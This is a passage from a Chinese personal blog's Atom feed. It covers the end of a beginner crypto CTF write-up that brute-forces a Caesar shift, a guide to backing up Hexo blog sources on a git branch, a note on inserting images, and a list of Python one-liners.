class="keyword">gdvlugxvkxjuq</span></span><br><span class="line"><span class="keyword">vmkamlpiiywyx</span></span><br><span class="line"><span class="keyword">sambkvlqsiaav</span></span><br><span class="line"><span class="keyword">fireinthehole</span></span><br><span class="line"><span class="keyword">uzaulcdkfprst</span></span><br><span class="line"><span class="keyword">wvfoomsyaupka</span></span><br><span class="line"><span class="keyword">irdtpxrppdldm</span></span><br><span class="line"><span class="keyword">kncsjzfnmnnjk</span></span><br><span class="line"><span class="keyword">psegzphtyadfg</span></span><br><span class="line"><span class="keyword">bjojqqecgjvhh</span></span><br><span class="line"><span class="keyword">eunvaonrhfhgi</span></span><br><span class="line"><span class="keyword">lwjdwwymbbgmw</span></span><br></pre></td></tr></table></figure><p>发现就<strong>fireinthehole</strong>是个可读的字符串</p><h2 id="9-easy-ECC"><a href="#9-easy-ECC" class="headerlink" title="9. easy_ECC"></a>9. easy_ECC</h2><p>是的,我不会</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;攻防世界-crypto-新手练习区&quot;&gt;&lt;a href=&quot;#攻防世界-crypto-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;攻防世界-crypto-新手练习区&quot;&gt;&lt;/a&gt;攻防世界-crypto-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;1-bas
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
      <category term="密码" scheme="https://mercer5.github.io/tags/%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>blog备份</title>
    <link href="https://mercer5.github.io/2020/04/04/blog%E5%A4%87%E4%BB%BD/"/>
    <id>https://mercer5.github.io/2020/04/04/blog%E5%A4%87%E4%BB%BD/</id>
    <published>2020-04-04T07:59:06.000Z</published>
    <updated>2020-08-24T15:30:09.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="备份blog"><a href="#备份blog" class="headerlink" title="备份blog"></a>备份blog</h1><hr><p>由于<code>hexo d</code>上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件。</p><p>也就是上传的是在本地目录里自动生成的<code>.deploy_git</code>里面。</p><p>其他文件 ，包括我们写在source 里面的，和配置文件，主题文件，都没有上传到github</p><p>由于最近电脑经常出问题,感觉还是乘早把东西都备份一下的好</p><hr><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><ol><li><p>在github中,作为blog的仓库新建一个分支</p><p>我建了一个hexo</p><p><img src="Snipaste_2020-04-04_15-36-20.png" alt="Snipaste_2020-04-04_15-36-20"></p></li><li><p>把新建的分支设为默认分支</p><p>这样的话,clone下来的,还有push上去的都只会在hexo分支中进行</p><p>而最开始的master分支,就会只用来存储静态网页</p><p><code>setting</code>—&gt;<code>branckes</code>—&gt;<code>hexo</code>—&gt;<code>update</code></p><p><img src="Snipaste_2020-04-04_15-40-38.png" alt="Snipaste_2020-04-04_15-40-38"></p></li></ol><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><ol><li><p>在你喜欢的地方新建一个文件夹</p></li><li><p>打开git bash ,clone一下文件</p><p><img src="Snipaste_2020-04-04_15-44-21.png" alt="Snipaste_2020-04-04_15-44-21"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">&lt;url</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>把clone到本地的文件删到只剩下<strong>.git</strong>文件夹</p><p><img src="Snipaste_2020-04-04_15-46-08.png" alt="Snipaste_2020-04-04_15-46-08"></p></li><li><p>把之前我们写的博客源文件全部复制过来，除了<code>.deploy_git</code>。这里应该说一句，复制过来的源文件应该有一个<code>.gitignore</code>，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这些类型文件不需要git：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.DS_Store</span></span><br><span class="line">Thumbs<span class="number">.</span><span class="built_in">db</span></span><br><span class="line"><span class="built_in">db</span><span class="number">.</span>json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line"><span class="meta">public</span>/</span><br><span class="line"><span class="meta">.deploy</span>*/</span><br></pre></td></tr></table></figure></li><li><p>看看theme/next 下面有没有<strong>.git</strong>文件夹,如果有,把删掉</p><p>因为git不能嵌套上传</p></li><li><p>文件夹中大概像图片那样就行了(aaaa,那个<code>.deploy_git</code>是之后生成的,忽略掉就好)</p><p><img src="Snipaste_2020-04-04_15-48-19.png" alt="Snipaste_2020-04-04_15-48-19"></p></li></ol><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit –m <span class="string">"backup"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure><p>然后去github康康,hexo分支应该就变成你文件夹中应该有的东西了</p><p><img src="Snipaste_2020-04-04_15-57-48.png" alt="Snipaste_2020-04-04_15-57-48"></p><p>而master分支没有变化</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>确保<code>hexo deploy</code>推送的是master分支，hexo目录下的_config.yml文件通常会配置deploy推送的目标地址，这个一般在最初使用hexo时，就会配置为master，不用改动：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/sherlockyb/sherlockyb.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>之后就可以在文件夹中快乐的使用了</p><h3 id="生成网页"><a href="#生成网页" class="headerlink" title="生成网页"></a>生成网页</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit -m <span class="string">"description"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;备份blog&quot;&gt;&lt;a href=&quot;#备份blog&quot; class=&quot;headerlink&quot; title=&quot;备份blog&quot;&gt;&lt;/a&gt;备份blog&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;由于&lt;code&gt;hexo d&lt;/code&gt;上传部署到github的其实是hexo编译后的文件，是用
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>blod插入图片</title>
    <link href="https://mercer5.github.io/2020/04/04/blod%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <id>https://mercer5.github.io/2020/04/04/blod%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</id>
    <published>2020-04-04T07:16:53.000Z</published>
    <updated>2020-08-24T15:30:09.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="blog插入图片"><a href="#blog插入图片" class="headerlink" title="blog插入图片"></a>blog插入图片</h1><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于微博图床没了,博主只能苦逼的找方法解决博客上所有图片显示失败问题了.</p><p>目前有三种方法</p><ul><li>用dl的方法(百度你值得拥有)继续使用,但还是算了<ol><li>太麻烦了,每个图片都要改</li><li>免费的图床风险还是太大,说没就没</li></ol></li><li>买服务器,这条路也不准备走<del>问就是没钱</del></li><li>所以只能把图片保存在本地了: )</li></ul><h2 id="搞起来"><a href="#搞起来" class="headerlink" title="搞起来"></a>搞起来</h2><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>可以将图片统一放在<code>source/images</code>文件夹中，通过markdown语法访问它们。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span><span class="regexp">/images/im</span>age.jpg![](<span class="regexp">/images/im</span>age.jpg)</span><br></pre></td></tr></table></figure><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>放在文章自己的目录中。文章的目录可以通过配置<code>_config.yml</code>来生成。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">_config</span>.</span></span>ymlpost_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>将<code>_config.yml</code>文件中的配置项<code>post_asset_folder</code>设为<code>true</code>后，执行命令<code>$ hexo new post_name</code>，在<code>source/_posts</code>中会生成文章<code>post_name.md</code>和同名文件夹<code>post_name</code>。将图片资源放在<code>post_name</code>中，文章就可以使用相对路径引用图片资源了。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_posts</span>/post_name/<span class="built_in">image</span>.jpg![](<span class="built_in">image</span>.jpg)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;blog插入图片&quot;&gt;&lt;a href=&quot;#blog插入图片&quot; class=&quot;headerlink&quot; title=&quot;blog插入图片&quot;&gt;&lt;/a&gt;blog插入图片&lt;/h1&gt;&lt;h2 id=&quot;现状&quot;&gt;&lt;a href=&quot;#现状&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>python-一行代码</title>
    <link href="https://mercer5.github.io/2020/02/13/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/"/>
    <id>https://mercer5.github.io/2020/02/13/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/</id>
    <published>2020-02-13T12:39:45.000Z</published>
    <updated>2020-08-24T15:30:09.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一行代码python"><a href="#一行代码python" class="headerlink" title="一行代码python"></a>一行代码python</h1><h2 id="1-100-的和"><a href="#1-100-的和" class="headerlink" title="1 - 100 的和"></a>1 - 100 的和</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum(range(<span class="number">1</span>,<span class="number">101</span>))</span><br></pre></td></tr></table></figure><h2 id="数值交换"><a href="#数值交换" class="headerlink" title="数值交换"></a>数值交换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a,b=b,a</span><br></pre></td></tr></table></figure><h2 id="奇偶数"><a href="#奇偶数" class="headerlink" title="奇偶数"></a>奇偶数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>]</span><br><span class="line"><span class="comment">#[0, 2, 4, 6, 8]</span></span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">1</span>]</span><br><span class="line"><span class="comment">#[1, 3, 5, 7, 9]</span></span><br></pre></td></tr></table></figure><h2 id="展开列表"><a href="#展开列表" class="headerlink" title="展开列表"></a>展开列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">[x <span class="keyword">for</span> y <span class="keyword">in</span> lst <span class="keyword">for</span> x <span class="keyword">in</span> y]</span><br><span class="line"><span class="comment">#[1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><h2 id="打乱列表"><a href="#打乱列表" class="headerlink" title="打乱列表"></a>打乱列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">lst=list(range(<span class="number">10</span>))</span><br><span class="line">random.shuffle(lst)</span><br><span class="line">lst</span><br></pre></td></tr></table></figure><h2 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"asdfghjkl"</span></span><br><span class="line">s[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#'lkjhgfdsa'</span></span><br></pre></td></tr></table></figure><h2 id="查看目录下所有文件"><a href="#查看目录下所有文件" class="headerlink" title="查看目录下所有文件"></a><strong>查看目录下所有文件</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir()</span><br></pre></td></tr></table></figure><h2 id="去除字符串间的空格"><a href="#去除字符串间的空格" class="headerlink" title="去除字符串间的空格"></a><strong>去除字符串间的空格</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"my name is mercer"</span></span><br><span class="line">s.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"my name is mercer"</span></span><br><span class="line"><span class="string">""</span>.join(s.split())</span><br></pre></td></tr></table></figure><h2 id="字符串整数列表变成整数列表"><a href="#字符串整数列表变成整数列表" class="headerlink" title="字符串整数列表变成整数列表"></a><strong>字符串整数列表变成整数列表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>]</span><br><span class="line">list(map(<span class="keyword">lambda</span> x: int(x),a))</span><br><span class="line"><span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure><h2 id="删除列表中重复的值"><a href="#删除列表中重复的值" class="headerlink" title="删除列表中重复的值"></a><strong>删除列表中重复的值</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">list(set(lst))</span><br><span class="line"><span class="comment">#[1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><h2 id="9-9-乘法表"><a href="#9-9-乘法表" class="headerlink" title="9 * 9 乘法表"></a><strong>9 * 9 乘法表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'\n'</span>.join([<span class="string">'\t'</span>.join([<span class="string">"%2s*%2s=%2s"</span>%(j,i,i*j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)]))</span><br></pre></td></tr></table></figure><h2 id="两个列表中相同的元素"><a href="#两个列表中相同的元素" class="headerlink" title="两个列表中相同的元素"></a>两个列表中相同的元素</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">set(a)&amp;set(b)</span><br><span class="line"><span class="comment">#&#123;3, 4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="两个列表中不同的元素"><a href="#两个列表中不同的元素" class="headerlink" title="两个列表中不同的元素"></a><strong>两个列表中不同的元素</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">set(a)^set(b)</span><br><span class="line"><span class="comment">#&#123;1, 2, 5, 6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="合并两个字典"><a href="#合并两个字典" class="headerlink" title="合并两个字典"></a><strong>合并两个字典</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">"name"</span>:<span class="string">"mercer"</span>&#125;</span><br><span class="line">b=&#123;<span class="string">"age"</span>:<span class="string">"100"</span>&#125;</span><br><span class="line">a.update(b)</span><br><span class="line">a</span><br><span class="line"><span class="comment">#&#123;'name': 'mercer', 'age': '100'&#125;</span></span><br></pre></td></tr></table></figure><h2 id="字典键从小到大排序"><a href="#字典键从小到大排序" class="headerlink" title="字典键从小到大排序"></a><strong>字典键从小到大排序</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">"name"</span>:<span class="string">"mercer"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"like"</span>:<span class="string">"python"</span>&#125;</span><br><span class="line">sorted(a.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#[('age', 100), ('like', 'python'), ('name', 'mercer')]</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一行代码python&quot;&gt;&lt;a href=&quot;#一行代码python&quot; class=&quot;headerlink&quot; title=&quot;一行代码python&quot;&gt;&lt;/a&gt;一行代码python&lt;/h1&gt;&lt;h2 id=&quot;1-100-的和&quot;&gt;&lt;a href=&quot;#1-100-的和&quot; cla
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
  </entry>
  
</feed>
